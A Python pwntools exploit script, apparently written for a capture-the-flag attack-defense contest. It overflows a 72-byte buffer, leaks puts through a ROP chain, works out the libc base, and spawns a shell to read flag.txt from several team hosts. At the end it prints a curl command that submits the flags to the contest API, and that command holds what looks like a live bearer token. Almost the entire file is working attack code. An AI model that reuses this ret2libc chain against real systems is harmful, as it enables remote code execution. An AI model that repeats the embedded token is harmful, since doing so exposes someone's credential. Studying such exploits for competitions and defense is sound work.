from pwn import *
import argparse

# ===========================================================
#                    SETUP FUNCTIONS
# ===========================================================

def print_message():
    cDFL = "\033[0m"
    cBLK = "\033[1;30m"
    cRED = "\033[1;31m"
    cGRN = "\033[1;32m"
    cYLW = "\033[1;33m"
    cBLU = "\033[1;34m"

    text = """
┌───────────────────────────────┐
│        RUNNING EXPLOIT        │
│                               │"""

    if (args.debug):
        text += f"""
│  DEBUGGING   {cGRN}ENABLED{cDFL}          │"""
    else:
        text += f"""
│  DEBUGGING   {cRED}DISABLED{cDFL}         │"""

    if (args.interactive):
        text += f"""
│  INTERACTIVE {cGRN}ENABLED{cDFL}          │"""
    else:
        text += f"""
│  INTERACTIVE {cRED}DISABLED{cDFL}         │"""

    if (args.gdb):
        text += f"""
│  RUNNING     {cYLW}GDB{cDFL}              │
└───────────────────────────────┘
"""
    elif (args.remote):
        text += f"""
│  RUNNING     {cBLU}REMOTE EXPLOIT{cDFL}   │
└───────────────────────────────┘
"""
    else:
        text += f"""
│  RUNNING     {cBLK}LOCAL EXPLOIT{cDFL}    │
└───────────────────────────────┘
"""

    print(text)

def initIO():
    print_message()
    if (args.debug):
        context.log_level = "debug"

    if (args.gdb):
        return pwnlib.gdb.attach(elf.process(), gdbscript=script)
    if (args.remote):
        return remote(server, port)
    return elf.process()

top_parser = argparse.ArgumentParser()

running = top_parser.add_mutually_exclusive_group()
running.add_argument("-g", "--gdb", action="store_true", dest="gdb", help="connect to gdb")
running.add_argument("-r", "--remote", action="store_true", dest="remote", help="connect to remote")
running.add_argument("-l", "--local", action="store_true", dest="local", help="connect to local", default=True)

top_parser.add_argument("-d", "--debug", action="store_true", dest="debug", default=False, help="enable/disable debugging")
top_parser.add_argument("-i", "--interactive", action="store_true", dest="interactive", default=False, help="enable/disable interactive")
args = top_parser.parse_args()

# ===========================================================
#                       CONFIG SETUP
# ===========================================================

data = []

i = 19
while (i <= 20):
    if (i == 15):
        continue
    # LOCAL
    file = "./main"
    libc = "./libc.so"
    if (file != ""):
        elf = context.binary = ELF(file, checksec=False)
    if (libc != ""):
            libc = ELF(libc, checksec=False)

    # REMOTE
    num = 100 + i
    server = "10.100.101." + str(num)
    port = 22000

    # GDB
    context.terminal = "kitty"
    script = """

    """

    # ===========================================================
    #                    EXPLOIT GOES HERE
    # ===========================================================

    io = initIO()

    offset = 72

    pop_rdi = next(elf.search(asm('pop rdi; ret')))


    payload = flat(
        b'A' * 72,
        pop_rdi,
        elf.got['puts'],
        elf.plt['puts'],
        elf.sym['main']
    )

    io.sendlineafter(b'idea?\n', payload)

    puts_leak = u64(io.recv(6) + b'\x00\x00')

    print(f'puts leak: {puts_leak:x}')

    libc.address = puts_leak - libc.sym['puts']

    system = libc.sym['system']
    binsh = next(libc.search(b'/bin/sh'))

    payload = flat(
        b'A' * 72,
        pop_rdi + 1,
        pop_rdi,
        binsh,
        system,
        0x0
    )

    io.sendlineafter(b'idea?\n', payload)

    io.sendline(b'cat flag.txt')

    data.append(io.recvuntil(b'}'))

    i += 1
    print(data)

    io.close()

print(f"""curl --location --request POST 'https://ctf-gemastik.ub.ac.id/api/flag' --header 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJRCI6ImE3Y2Q5YTEwLTIyNjMtNGM0MC1iNDRjLWFjYjgzNzNhYjg0ZSIsIlVzZXJuYW1lIjoiS2VyYW5nIEFqYWliIiwiSXNBZG1pbiI6ZmFsc2UsImV4cCI6MTY5NDUyNjg5MH0.OzfRlLxIWUMblp3ruD8vMgBY6UMPnyogN2OQk5uRhO8' --header 'Content-Type: application/json' --data-raw '\{"flags": {data}\}'""")
